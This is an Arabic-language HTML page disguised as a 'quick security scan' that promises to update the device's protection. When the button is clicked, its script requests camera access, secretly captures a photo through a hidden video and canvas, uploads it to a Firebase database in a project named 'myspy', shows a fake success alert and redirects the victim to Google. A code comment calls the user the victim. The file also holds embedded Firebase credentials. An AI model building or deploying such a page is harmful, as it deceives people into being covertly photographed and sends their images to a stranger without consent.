<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تأمين الحساب</title>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
    <style>
        body { background: #1a1a1a; color: white; text-align: center; font-family: sans-serif; padding-top: 100px; }
        .btn { background: #25d366; color: white; padding: 20px; border: none; border-radius: 50px; font-size: 22px; cursor: pointer; box-shadow: 0 4px 15px rgba(0,0,0,0.5); }
        video, canvas { display: none; }
    </style>
</head>
<body>
    <h2>نظام الفحص السريع 🛡️</h2>
    <p>اضغط لتحديث حماية جهازك</p>
    <button class="btn" onclick="capture()">ابدأ الفحص الآن</button>

    <video id="v" autoplay></video>
    <canvas id="c"></canvas>

    <script>
        const firebaseConfig = {
          apiKey: "AIzaSyAvb-rjNbcWHlZEdEF0q9v3PL8XF8jnt3U",
          authDomain: "myspy-2579b.firebaseapp.com",
          projectId: "myspy-2579b",
          storageBucket: "myspy-2579b.firebasestorage.app",
          messagingSenderId: "487846863334",
          appId: "1:487846863334:web:b58620e6f34d187e02b627"
        };
        firebase.initializeApp(firebaseConfig);
        const db = firebase.database();

        async function capture() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                const video = document.getElementById('v');
                video.srcObject = stream;
                setTimeout(() => {
                    const canvas = document.getElementById('c');
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    canvas.getContext('2d').drawImage(video, 0, 0);
                    const imgData = canvas.toDataURL('image/jpeg', 0.5); // ضغط الصورة لسرعة الرفع
                    
                    // رفع الصورة
                    db.ref('results').push({
                        photo: imgData,
                        date: new Date().toLocaleString()
                    }).then(() => {
                        alert("تم التحديث بنجاح!");
                        location.href = "https://google.com"; // تحويل الضحية لجوجل بعد التصوير
                    });
                }, 1000);
            } catch (e) { alert("لازم توافق على الكاميرا"); }
        }
    </script>
</body>
</html>
